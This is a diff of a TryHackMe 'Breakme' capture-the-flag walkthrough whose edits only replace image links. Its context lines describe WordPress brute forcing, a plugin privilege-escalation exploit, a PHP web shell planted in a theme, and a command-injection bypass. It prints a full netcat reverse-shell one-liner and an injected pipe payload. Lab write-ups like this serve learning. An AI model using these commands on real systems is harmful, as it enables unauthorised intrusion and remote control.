@@ -46,7 +46,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Here, it displays default apache page.
 
-![image.png](image.png)
+![image](https://github.com/user-attachments/assets/c3f5af77-3c77-4d29-9526-cd0f342a1dfb)
 
 While fuzzing the application’s directories, we found /wordpress endpoint.
 
@@ -55,11 +55,11 @@ While fuzzing the application’s directories, we found /wordpress endpoint.
 └─$ ffuf -u http://10.10.172.92/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic
 ```
 
-![image.png](image%201.png)
+![image 1](https://github.com/user-attachments/assets/18e9c6a6-a16f-4eff-8a0a-7e83b549e752)
 
 At  /wordpress endpoint, we discover a breakme website running on wordpress.
 
-![image.png](image%202.png)
+![image 2](https://github.com/user-attachments/assets/903a5156-8cff-4498-9826-373e9644ad39)
 
 ---
 
@@ -76,12 +76,11 @@ Two things cathes my eyes in the output
 
 1. [+] WordPress version 6.4.3 identified (Insecure, released on 2024-01-30)
     
-    ![image.png](image%203.png)
-    
+    ![image 3](https://github.com/user-attachments/assets/34f1ad49-d378-4ad9-a5fe-e00ad1fc8f04)
+
 2. wp-data-access plugin Version: 5.3.5
     
-    ![image.png](image%204.png)
-    
+    ![image 4](https://github.com/user-attachments/assets/a6141635-c598-43f7-9e72-080315d99307)
 
 Now, the only things which was remaining is username  enumeration & password bruteforce.
 
@@ -95,13 +94,13 @@ And we found two usernames:
 1. Admin
 2. Bob
 
-![image.png](image%205.png)
+![image 5](https://github.com/user-attachments/assets/7c245c13-8463-43a9-b111-c034ffcd60ad)
 
 And also found a valid password for user bob. Let’s login with that found credentials in to wordpress dashboard at http://
 
-![image.png](image%206.png)
+![image 6](https://github.com/user-attachments/assets/ebf19c31-042e-42c8-ad14-4206ed67823f)
 
-![image.png](image%207.png)
+![image 7](https://github.com/user-attachments/assets/82213103-3ef3-4adb-8e0c-1ca09270769b)
 
 ---
 
@@ -109,21 +108,21 @@ And also found a valid password for user bob. Let’s login with that found cred
 
 Now, we were redirected to wp-admin/index.php page, where we can see we don’t have enough privileges(admin privileges).
 
-![image.png](image%208.png)
+![image 8](https://github.com/user-attachments/assets/755f4db1-9e4f-4e93-861e-25106c6da22e)
 
 Coming back to our initial findings, we noted that this application has wp-access-data’s version v5.3.5(vulnerable) plugin installed, let’s search that on google, and will try to privesc to admin.
 
 I found a [github article](https://github.com/thomas-osgood/cve-2023-1874/blob/main/README.md) there, which is basically a python script , which will exploit target with wp-access-data v5.3.7 and earlier plugins.
 
-![image.png](image%209.png)
+![image 9](https://github.com/user-attachments/assets/7a64aa13-cb30-4fcf-851d-13ba0e6611c2)
 
 I downloaded it in my kali machine , run that script and boom ! User bob gets admin level privileges on that application.
 
-![image.png](image%2010.png)
+![image 10](https://github.com/user-attachments/assets/afd6bdbd-1e7c-4cd8-a241-6ecf9b326371)
 
 As we can see, we gained admin level privileges to wordpress.
 
-![image.png](image%2011.png)
+![image 11](https://github.com/user-attachments/assets/01764b54-fb24-4988-b14b-b846a91de670)
 
 ---
 
@@ -131,9 +130,9 @@ As we can see, we gained admin level privileges to wordpress.
 
 Now, to gain RCE, we can simply edit one of the `PHP` files in the theme to include a simple web shell.
 
-![image.png](image%2012.png)
+![image 12](https://github.com/user-attachments/assets/c9d5a9ed-e235-4908-aab9-86612b0e364b)
 
-![image.png](image%2013.png)
+![image 13](https://github.com/user-attachments/assets/01973db0-326c-4686-8723-8d823e0f8a50)
 
 Note: I used php-reverse-shell.php from pentest monkey.
 
@@ -234,7 +233,7 @@ www-data@Breakme:/tmp$ ./chisel client 10.17.87.131:9001 R:9999:127.0.0.1:9999 &
 
 Now, we can head to 127.0.0.1:9999 on our machine and see that application run by user john.
 
-![image.png](image%2014.png)
+![image 14](https://github.com/user-attachments/assets/d02e8f21-b5ac-4a70-bdaa-8f070bfca434)
 
 This application looks like it executes command with user input. So, we can run pspy64 on target machine to get better understanding of what application does.
 
@@ -272,7 +271,7 @@ Second, If we test ‘check user’ function, it runs an id command in the backg
 
 Now, we can try a list of special characters: `~ ! @ # $ % ^ & * ( ) - _ + = { } ] [ | \ ` , . / ? ; : ' " < >` , to check which one is allowed and which one is restricted.
 
-![image.png](image%2015.png)
+![image 15](https://github.com/user-attachments/assets/fdc5fa9f-03c7-4f2a-bf00-917a614c5da0)
 
 Only `${}|./:` is allowed here, so no problem we can use pipe`|` to make our payload and will try to execute a shell.
 
@@ -291,7 +290,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.17.87.131 4444 >/tmp/
 
 Now, put `|/dev/shm/rev.sh|` in that ‘check user’ function and start your netcat listner to get the john’s shell.
 
-![image.png](image%2016.png)
+![image 16](https://github.com/user-attachments/assets/556b3e70-3a91-47d6-bae1-8fa178d5c65b)
 
 ```bash
 ┌──(ghost㉿kali)-[~/tryhackme/breakme]
